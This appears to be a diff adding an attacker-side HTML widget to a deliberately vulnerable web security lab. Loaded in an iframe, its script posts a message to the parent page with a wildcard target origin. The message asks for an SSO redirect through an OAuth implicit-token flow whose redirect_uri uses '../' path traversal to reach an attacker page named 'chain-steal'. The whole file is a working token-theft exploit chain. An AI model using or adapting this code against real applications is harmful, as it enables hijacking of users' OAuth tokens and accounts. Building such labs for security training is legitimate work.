@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Malicious Widget</title>
+  <style>
+    body { font-family: sans-serif; background: #1a0a0a; color: #e2e8f0; padding: 12px; margin: 0; font-size: 13px; }
+  </style>
+</head>
+<body>
+  <div style="color:#ef4444;font-weight:bold;margin-bottom:8px">&#9760; Attacker Widget Loaded</div>
+  <div id="log" style="font-family:monospace;font-size:11px"></div>
+
+  <script>
+    var log = document.getElementById('log');
+    log.innerHTML += '<div style="color:#22c55e">Widget loaded in iframe!</div>';
+
+    // Send postMessage to parent to trigger SSO redirect
+    log.innerHTML += '<div>Sending SSO redirect postMessage to parent...</div>';
+
+    // This would redirect the parent through an OAuth flow
+    try {
+      parent.postMessage({
+        type: 'sso_redirect',
+        url: '/oauth/authorize?client_id=vuln-app&response_type=token&state=widget_chain&redirect_uri=' +
+          encodeURIComponent('http://localhost:3000/oauth/callback/../../../labs/attacker/chain-steal.html')
+      }, '*');
+      log.innerHTML += '<div style="color:#ef4444">SSO redirect sent to parent!</div>';
+    } catch(e) {
+      log.innerHTML += '<div style="color:#ef4444">Error: ' + e.message + '</div>';
+    }
+
+    // Also notify about chain completion
+    setTimeout(function() {
+      try {
+        parent.postMessage({ type: 'chain_complete' }, '*');
+      } catch(e) {}
+    }, 2000);
+  </script>
+</body>
+</html>
